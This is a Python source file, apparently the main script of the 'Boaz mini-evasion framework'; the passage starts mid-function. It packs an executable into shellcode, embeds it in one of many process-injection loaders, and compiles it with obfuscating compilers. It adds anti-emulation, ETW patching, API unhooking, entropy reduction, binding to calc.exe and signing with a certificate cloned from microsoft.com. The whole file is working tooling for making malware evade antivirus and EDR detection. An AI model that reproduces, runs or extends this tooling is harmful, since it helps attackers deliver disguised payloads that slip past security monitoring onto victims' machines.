        additional_sources.extend(['./evader/anti_emu.c', '-lws2_32', '-lpsapi', '-lole32'])
    if etw:
        additional_sources.append('./evader/etw_pass.c')
    ## TODO: Add support for other encoding types
    if encoding:
        if encoding == 'uuid':
            additional_sources.append('./converter/uuid_converter.c')
        elif encoding == 'xor':
            additional_sources.append('./converter/xor_converter.c')
        elif encoding == 'mac':
            additional_sources.append('./converter/mac_converter.c')
        elif encoding == 'ipv4':
            additional_sources.append('./converter/ipv4_converter.c')  ### Add IPV6 converter in the future
        elif encoding == 'base45':
            additional_sources.append('./converter/base45_converter.c')
        elif encoding == 'base64':
            additional_sources.append('./converter/base64_converter.c')
        elif encoding == 'base58':
            additional_sources.append('./converter/base58_converter.c')
        elif encoding == 'aes':
            additional_sources.append('./converter/aes_converter.c')
        elif encoding == 'chacha':
            additional_sources.append('./converter/chacha_converter.c')
        elif encoding == 'aes2':
            additional_sources.append('./converter/aes2_converter.c')
        elif encoding == 'ascon':
            additional_sources.append('./converter/ascon_converter.c')
        elif encoding == 'rc4':
            additional_sources.append('./converter/rc4_converter.c')
    if dream:
        additional_sources.append('./evader/sleep_encrypt.c')
    if god_speed:
        additional_sources.append('./evader/god_speed.c')
    if sleep_flag:
        additional_sources.append('./evader/sweet_sleep.c')
    if insert_junk_api_calls:
        additional_sources.append('./evader/normal_api.c')
    if api_unhooking:
        additional_sources.append('./evader/api_untangle.c')
    additional_sources.append('-static-libgcc')
    additional_sources.append('-static-libstdc++')

    if compiler == "akira":
        print("Compiling with Akira...")

        compile_command = ["./akira_built/bin/clang++", '-I.', '-I./converter', '-I./evader', "-D", "nullptr=NULL", "-mllvm", "-irobf-indbr", "-mllvm", "-irobf-icall",
                           "-mllvm", "-irobf-indgv", "-mllvm", "-irobf-cse", "-mllvm", "-irobf-cff", "-target", "x86_64-w64-mingw32",
                           loader_path, "./classic_stubs/syscalls.c", "./classic_stubs/syscallsstubs.std.x64.s", "-o", output_name, "-v",
                           "-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32", "-L./clang_test_include", "-I./c++/", "-I./c++/mingw32/"] + additional_sources
        subprocess.run(compile_command, check=True)
    elif compiler == "pluto":
        # Pluto-specific compilation command
        compile_command = ["./llvm_obfuscator_pluto/bin/clang++", '-I.', '-I./converter', '-I./evader', "-fms-extensions", "-D", "nullptr=NULL", "-O3", "-flto", "-fuse-ld=lld",
                           "-mllvm", "-passes=mba,sub,idc,bcf,fla,gle", "-Xlinker", "-mllvm", "-Xlinker", "-passes=hlw,idc",
                           "-target", "x86_64-w64-mingw32", loader_path, "./classic_stubs/syscalls.c", "./classic_stubs/syscallsstubs.std.x64.s", "-o", output_name, "-v",
                           "-L/usr/lib/gcc/x86_64-w64-mingw32/12-win32", "-L./clang_test_include", "-I./c++/", "-I./c++/mingw32/"] + additional_sources
        subprocess.run(compile_command, check=True)
    elif syswhisper_option == 1:
        # Random syscall jumps compilation
        print("Compiling with random syscall jumps.....")
        compile_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter',  '-I./evader', loader_path, './classic_stubs/syscalls.c', './classic_stubs/syscallsstubs.rnd.x64.s', '-DRANDSYSCALL', '-Wall'] + additional_sources + ['-o', 'temp.exe']
        strip_command = ['x86_64-w64-mingw32-strip', '-s', 'temp.exe', '-o', output_name]
        subprocess.run(compile_command, check=True)
        subprocess.run(strip_command, check=True)
        cleanup_command = ['rm', '-rf', 'temp.exe']
        subprocess.run(cleanup_command, check=True)
        

    elif syswhisper_option == 2:
        # Compiling with MingW and NASM requires a two-step process
        # Find all .o files in the current directory
        object_files = glob.glob('*.o')

        # First, compile C files and syscalls.c with additional sources
        mingw_compile_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter', '-I./evader', '-m64', '-c', loader_path, './classic_stubs/syscalls.c'] + ['-Wall', '-shared']
        subprocess.run(mingw_compile_command, check=True)
        print("MingW command executed successfully")
        
        # NASM compilation for the syscall stubs
        nasm_command = ['nasm', '-I.', '-I./converter',  '-I./evader', '-f', 'win64', '-o', 'syscallsstubs.std.x64.o', './classic_stubs/syscallsstubs.std.x64.nasm']
        subprocess.run(nasm_command, check=True)
        print("NASM command executed successfully")

        # Final linking of all objects to create the executable
        # final_link_command = ['x86_64-w64-mingw32-g++', '*.o', '-o', 'temp.exe'] + additional_sources
        final_link_command = ['x86_64-w64-mingw32-g++', '-I.', '-I./converter', '-I./evader'] + object_files + ['-o', 'temp.exe'] + additional_sources
        subprocess.run(final_link_command, check=True)
        print("Final link command executed successfully")
        
        # Stripping the executable
        strip_command = ['x86_64-w64-mingw32-strip', '-s', 'temp.exe', '-o', output_name]
        subprocess.run(strip_command, check=True)
        print("Strip command executed successfully")
        
        # Cleanup temporary files
        cleanup_command = ['rm', '-rf', 'temp.exe'] + object_files
        subprocess.run(cleanup_command, check=True)
    else:
        raise ValueError("Invalid SysWhisper option provided.")

    # Success message
    print(f"\033[95m[+] Congratulations!\033[0m The packed binary has been successfully generated with SysWhisper integration: \033[91m{output_name}\033[0m")

def strip_binary(binary_path):
    """
    Strips all symbols from the binary to reduce its size and potentially increase its stealth.

    Args:
    binary_path (str): Path to the compiled binary to be stripped.
    """
    try:
        subprocess.run(['strip', '--strip-all', binary_path], check=True)
        print(f"\033[92m [+] Successfully stripped the binary: {binary_path} \033[0m")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to strip the binary {binary_path}: {e}")


def cleanup_files(*file_paths):
    """Deletes specified files to clean up."""
    for file_path in file_paths:
        try:
            os.remove(file_path)
            # print(f"Deleted temporary file: {file_path}")
        except OSError as e:
            print(f"Error deleting temporary file {file_path}: {e}")
            print(f"File may not exists.")


def main():

    # ANSI escape code for cyan text (approximation of Cambridge blue)
    start_color_cyan = "\033[0;36m"
    # ANSI escape code for magenta text (purple)
    start_color_magenta = "\033[0;35m"
    # ANSI reset code to revert to default terminal color
    reset_color = "\033[0m"
    print(start_color_cyan + """


    ╭━━╮╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
    ┃╭╮┃╱╱╱╱╱╱╱╱╱╱╱┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
    ┃╰╯╰┳━━┳━━┳━━━╮┃╰━━┳╮╭┳━━┳━━┳┳━━┳━╮╱╰╯┃┃┣┻━┳━━┫┃
    ┃╭━╮┃╭╮┃╭╮┣━━┃┃┃╭━━┫╰╯┃╭╮┃━━╋┫╭╮┃╭╮╮╱╱┃┃┃╭╮┃╭╮┃┃
    ┃╰━╯┃╰╯┃╭╮┃┃━━┫┃╰━━╋╮╭┫╭╮┣━━┃┃╰╯┃┃┃┃╱╱┃┃┃╰╯┃╰╯┃╰╮
    ╰━━━┻━━┻╯╰┻━━━╯╰━━━╯╰╯╰╯╰┻━━┻┻━━┻╯╰╯╱╱╰╯╰━━┻━━┻━╯

                                                            
    .@@@@@@&%#%                                             
    .@@@@@@@%#(                                             
    #@@@@@@@&#((                                            
   @@@@@@@@@&&%%%                                           
    %#%%@@@@%(/*,                               ..          
    %**,,,,*****.                          #%##((////(.     
     .//***//*/                          ,%%%##(((((((#(    
   .%&%%/,,,**(#%&,                       */(##########%.   
  &@@@&&%(//   *%&@#                      ********/%%%%%    
 &@@@&%%&%(/   *%&@&,.                     *//////#&&&&#    
.@@@&&%##&%#(/ /&&&&*.                  .*  ***/(#&&&#      
 @@@@&&%%%%&&%%%&&*               ((  .(    /***.   .,,*    
   *%&&&&&%#/,                    .//,(((/(%#/(.**,.*,,,*,  
                                 /**,,/(((#&&&%, *%*******. 
                                 ,//*/%(((%&(// ....,/**//. 
                                       (*((((/////////////. 
                                              .,*//**,                                                                                 
                                                                                

          
    """ + reset_color)
    print(start_color_magenta + "Boaz mini-evasion framework is starting...\n" + reset_color)

    time.sleep(0.5)  # Sleeps for 2 seconds


    # Extended description for loaders
    loaders_description = """
    loader modules:
    1.  Custom Stack syscalls with threadless execution (local injection)
    2.  APC test alert
    3.  Sifu syscall
    4.  UUID manual injection
    5.  Remote mockingJay
    6.  Local thread hijacking 
    7.  Function pointer invoke local injection
    8.  Ninja_syscall2 
    9.  RW local mockingJay
    10. Ninja syscall 1
    11. Sifu Divide and Conquer syscall
    12. [Your custom loader here]
    14. Exit the process without executing the injected shellcode
    15. Syswhispers2 classic native API calls
    16. Classic userland API calls (VirtualAllcEx --> WriteProcessMemory --> Cre-ateRemoteThread)
    17. Sifu SysCall with Divide and Conquer
    18. Classic userland API calls with WriteProcessMemoryAPC
    19. DLL overloading 
    20. Stealth new Injection (WriteProcessMemoryAPC + DLL overloading)
    21.
    22.
    23.
    24.
    25.
    26. Stealth new Injection (3 WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing)
    27. Stealth new Injection (3 Custom WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing + Halo's gate patching)
    28. Halo's gate patching syscall injection + Custom write code to Process Memory by either MAC or UUID convertor + invisible dynamic loading (no loadModuleHandle, loadLibrary, GetProcessAddress)
    31. MAC address injection
    32. Stealth new injection (Advanced)
    33. Indirect Syscall + Halo gate + Custom Call Stack
    37. Stealth new loader (Advanced, evade memory scan)
    38. A novel PI with APC write method and phantom DLL overloading execution (CreateThread pointed to a memory address of UNMODIFIED DLL.)
    39. Custom Stack PI (remote) with threadless execution
    40. Custom Stack PI (remote) Threadless DLL Notification Execution
    41. Custom Stack PI (remote) with Decoy code execution
    """

    def check_non_negative(value):
        ivalue = int(value)
        if ivalue < 0:
            raise argparse.ArgumentTypeError("%s is an invalid non-negative int value" % value)
        return ivalue

    def print_selected_options(args):
        for arg, value in vars(args).items():
            if value is not None and value is not False:
                print(f"[+] Option \033[95m'{arg}'\033[0m is selected with argument:\033[91m {value} \033[0m")
                
    parser = argparse.ArgumentParser(
        description='Process loader and shellcode.',
        epilog=loaders_description,
        formatter_class=argparse.RawDescriptionHelpFormatter 
    )

    parser.add_argument('-f', '--input-file', required=True, help='Path to binary.exe')
    parser.add_argument('-o', '--output-file', help='Optional: Specify the output file path and name. If not provided, a random file name will be used in the ./output directory.')

    parser.add_argument('-divide', action='store_true', help='Divide flag (True or False)')
    parser.add_argument('-l', '--loader', type=check_non_negative, default=1, help='Loader number (must be a non-negative integer)')
    parser.add_argument('-dll', action='store_true', help='Compile the output as a DLL instead of an executable, can be run with rundll32.exe')
    parser.add_argument('-cpl', action='store_true', help='Compile the output as a CPL instead of an executable, can be run with control.exe')


    parser.add_argument('-sleep', action='store_true', help='Obfuscation Sleep flag with random sleep time (True or False)')
    parser.add_argument('-a', '--anti-emulation', action='store_true', help='Anti-emulation flag (True or False)')
    parser.add_argument('-etw', action='store_true', help='Enable ETW patching functionality')

    parser.add_argument('-j', '--junk-api', action='store_true', help='Insert junk API function call at a random location in the main function (5 API functions)')

    parser.add_argument('-dream', type=int, nargs='?', const=1500, default=None,
                        help='Optional: Sleep with encrypted stacks for specified time in milliseconds. Defaults to 1500ms if not provided.')


    parser.add_argument('-u', '--api-unhooking', action='store_true', help='Enable API unhooking functionality')
    parser.add_argument('-g', '--god-speed', action='store_true', help='Enable advanced unhooking technique Peruns Fart (God Speed)')

    parser.add_argument('-t', '--shellcode-type', default='donut', choices=['donut', 'pe2sh', 'rc4', 'amber'], help='Shellcode generation tool: donut (default), pe2sh, rc4, or amber')
    parser.add_argument('-sd', '--star_dust', action='store_true', help='Enable Stardust PIC generator, input should be .bin')


    parser.add_argument('-sgn', '--encode-sgn', action='store_true', help='Encode the generated shellcode using sgn tool.')

    ## TODO: Add support for other encoding types
    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base45', 'base64', 'base58', 'aes', 'chacha', 'aes2', 'ascon'], help='Encoding type: uuid, xor, mac, ip4, base64, base58 AES and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')


    parser.add_argument('-c', '--compiler', default='mingw', choices=['mingw', 'pluto', 'akira'], help='Compiler choice: mingw (default), pluto, or akira')
    parser.add_argument('-mllvm', type=lambda s: [item.strip() for item in s.split(',')], default=None, help='LLVM passes for Pluto or Akira compiler')
    parser.add_argument('-obf', '--obfuscate', action='store_true', help='Enable obfuscation (optional)')

    parser.add_argument('-w', '--syswhisper', type=int, nargs='?', const=1, default=None,
                        help='Optional: Use SysWhisper for direct syscalls. 1 for random syscall jumps (default), 2 for compiling with MingW and NASM.')

    parser.add_argument('-entropy', type=int, choices=[1, 2], default=0, help='Entropy level for post-processing the output binary. 1 for null_byte.py, 2 for pokemon.py')
    parser.add_argument('-b', '--binder', nargs='?', const='binder/calc.exe', help='Optional: Path to a utility for binding. Defaults to binder/calc.exe if not provided.')
    parser.add_argument('-s', '--sign-certificate', nargs='?', const='www.microsoft.com', help='Optional: Sign the payload using a cloned certificate from the specified website. Defaults to www.microsoft.com if no website is provided.')

    args = parser.parse_args()


    print_selected_options(args)

    # Adjust shellcode_file name based on the shellcode type
    if args.shellcode_type == 'donut':
        shellcode_file = 'note_donut'
    elif args.shellcode_type == 'pe2sh':
        shellcode_file = 'note_pe2sh'
    elif args.shellcode_type == 'rc4':
        shellcode_file = 'note_rc4'
    elif args.shellcode_type == 'amber':
        shellcode_file = 'note_amber'
    else:
        # Default case, though this should never be hit due to argparse choices constraint
        shellcode_file = 'note_donut'


    if args.star_dust:
        handle_star_dust(args.input_file)
        # Change input file to the generated boaz.x64.bin for further processing
        args.input_file = 'boaz.x64'

    generate_shellcode(args.input_file, shellcode_file, args.shellcode_type, args.encode_sgn, args.encoding, args.star_dust)
    if args.star_dust:
        shellcode_file = f'boaz.x64'
    shellcode = read_shellcode(shellcode_file)
    # print shellcode_file
    # print(f"[!]  Shellcode file: {shellcode_file}")

    template_loader_path = f'loaders/loader_template_{args.loader}.c' if args.loader != 1 else 'loaders/loader1.c'
    output_loader_path = f'loaders/loader{args.loader}_modified.c' if args.loader != 1 else 'loaders/loader1_modified.c'
    
    ### Deal with syswhisper option:
    # Determine if SysWhisper-specific handling is required
    use_syswhisper = args.syswhisper is not None or args.loader == 15

    if use_syswhisper:
        # Override loader template and output paths for SysWhisper or loader 15
        template_loader_path = 'loaders/loader_template_15.c'
        output_loader_path = 'loaders/loader15_modified.c'


    if args.output_file:
        output_file_path = args.output_file
        output_dir = os.path.dirname(output_file_path) or '.'  # Use current directory if no directory is specified

        # The os.makedirs call with exist_ok=True ensures that the directory is created if it does not exist,
        # and does nothing if it already exists, preventing any FileNotFoundError
        os.makedirs(output_dir, exist_ok=True)
    else:
        # If no -o option is provided, use the ./output directory
        print("No output file specified. Using the default ./output directory.\n")
        output_dir = './output'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Generate a random filename for the output file
        random_filename = generate_random_filename() + '.exe'
        output_file_path = os.path.join(output_dir, random_filename)

    file_name = os.path.basename(output_file_path)



    # print(f"Output file name: {file_name}")
    ##print the args.encoding:
    # print(f"using encoding option: {args.encoding}")
    # write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding)
    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl, star_dust = args.star_dust)

    if args.obfuscate:
        print("Obfuscating the loader code...\n")
        run_obfuscation(output_loader_path)
        obfuscated_loader_path = output_loader_path.replace('.c', '_obf.c')
    else:
        # If obfuscation is not applied, use the original loader path
        obfuscated_loader_path = output_loader_path

    
    ## if compile_as_dll is set, change the output name to a .dll file:
    if args.dll:
        output_file_path = output_file_path.replace('.exe', '.dll')
        print("Compiling as a DLL file... \n")
    elif args.cpl:
        output_file_path = output_file_path.replace('.exe', '.cpl')
        print("Compiling as a CPL file... \n")


    ##print the output_file_path
    print(f"Output file path: {output_file_path}")
    if use_syswhisper:
        compile_with_syswhisper(obfuscated_loader_path, output_file_path, args.syswhisper if args.syswhisper is not None else 1, args.sleep, args.anti_emulation, args.junk_api, args.compiler, args.api_unhooking, args.god_speed, args.encoding, args.dream, args.etw)
    else:
        compile_output(obfuscated_loader_path, output_file_path, args.compiler, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.mllvm, args.god_speed, args.encoding, args.loader, args.dream, args.etw, args.dll, args.cpl)

    strip_binary(output_file_path)

    ## uncomment the below line to clean up obfuscation code base: 
    # cleanup_files(output_loader_path, output_loader_path.replace('.c', '_obf.c'))

    ### Reduce the entropy to 6.1: 
    if args.entropy == 1:
        # Run null_byte.py on the output binary
        subprocess.run(['python3', './entropy/null_byte.py', output_file_path], check=True)
    elif args.entropy == 2:
        # Run pokemon.py on the output binary
        subprocess.run(['python3', './entropy/pokemon.py', output_file_path], check=True)
    elif args.entropy == 0:
        print("No entropy reduction applied.\n")

    if args.binder:
        temp_output_file_path = output_file_path.replace('.exe', '_temp.exe')
        binder_utility = args.binder if args.binder else 'binder/calc.exe'
        subprocess.run(['wine', 'binder/binder.exe', output_file_path, binder_utility, binder_utility, '-o', temp_output_file_path], check=True)
        ## rename temp file back to original:
        os.rename(temp_output_file_path, output_file_path)

    if args.sign_certificate:
        website = args.sign_certificate  # Website provided by the user or default
        signed_output_file_path = "signed_" + os.path.basename(output_file_path)

        # Check if the signed binary already exists
        if os.path.exists(signed_output_file_path):
            overwrite = input(f"The file '{signed_output_file_path}' already exists. Do you want to overwrite it? (Y/N): ").strip().upper()
            if overwrite == 'Y':
                os.remove(signed_output_file_path)  # Remove the existing file to overwrite
            elif overwrite == 'N':
                print("Exiting the signing process as per user request.")
                exit()  # Exit if the user does not want to overwrite the file
            else:
                print("Invalid input. Exiting the signing process.")
                exit()  # Exit for any other input

        # If the file does not exist or the user has chosen to overwrite it, proceed with signing
        carbon_copy_command = f"python3 signature/CarbonCopy.py {website} 443 {output_file_path} {signed_output_file_path}"
        subprocess.run(carbon_copy_command, shell=True, check=True)
        print(f"\033[95m [+] Signed binary generated \033[0m: \033[92m{signed_output_file_path}\033[0m")


if __name__ == '__main__':
    main()












            #                     ,**///////**,                                   
            #              /@@@@@@@@@@@@@@@&&&%%%###%(                            
            #              @@@@@@@@@@@@@@@@&&&%%####&%                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #             (@@@@@@@@@@@@@@@@@@&&%%##(((&,                          
            #          #@@@@@@@@@@@@@@@@@@@@@@&%%###((###%,                       
            #         %@@@@@@@@@@@@@@@@@@@@@@@&&%#####%%%%%.                      
            #         ,@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&%%%%%&                       
            #           /@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&                         
            #           (@&&&@@@@@@@@@@@@@@@@@@@@@@&%####*                        
            #           (@@@@@&&&////////////((((#########                        
            #           *@@%#@@@&((///////((((((########%(                        
            #            #@%####((((((((((((((#######%##%                         
            #             .(%%%####################%%(#%                          
            #               .%%%%%#############%%%%((%/                           
            #                  #%%%%%%%%%%%%%%%#((%%#*.                           
            #                /%%%%(%%%%%####%%%%%#/,*%##%&(                       
            #            ,&&&&%%%%#%*,,,*/(((((#(,,#(/%##%&&@/                    
            #          %&&&@&&&&%%###%,,****,*%(#&&@@&###%%&@@@(                  
            #        %@@@@@@@@&&&%%%###(,@@@&@@&%*/#%#.##%%&@@@@&.                
            #      ,@@@@@@@@@&@&&&%%%##(#*%@*         .##%%&@@@@@&.               
            #     *@@@@@@@@@@&&&@&&%%%##(((.           ##%%&&@@@@@%               
            #    .@&@@@@@@@@&&&%%%&&%%%##((//          ##%%&&@@@@&@*...           
            #    &&@@@@@@@&&&&&%%%#&&&%%##(((/*        #%%%&&&@&&&&(.....         
            #   .@@@@@@@@@&&&&%%%####&&%%%##(((/,     .%%%&&&@@&&&&%....          
            #   ,@@@@@@@@@@&&&%%%#####%&&%%%##((((.   .%%&&&@&&&&&&#...           
            #   ,@@@@@@@@@@&&&%%%%%#####&&&%%%####((  .%&&&@&&&&&&/..             
            #   .@@@@@@@@@@&&&&%%%%%%%%%%%&&&%%%%%###/.&&@&&&&&&*..               
            #    (@@@@@@@@@@&&&&&%%%%%%%%%%%%&&&&%%%%%%@&&&&%*..                  
            #     .#@@@@@@@@&&&&&&%%%%%%%%%%%%%%%&%%&&&&/,.                       
            #       .,*#&@@@&&&&&&&&%%%%%%%%&&&&%(*...                            
            #             .,,**********,,...                                      
                                                    
                                                    
                                                    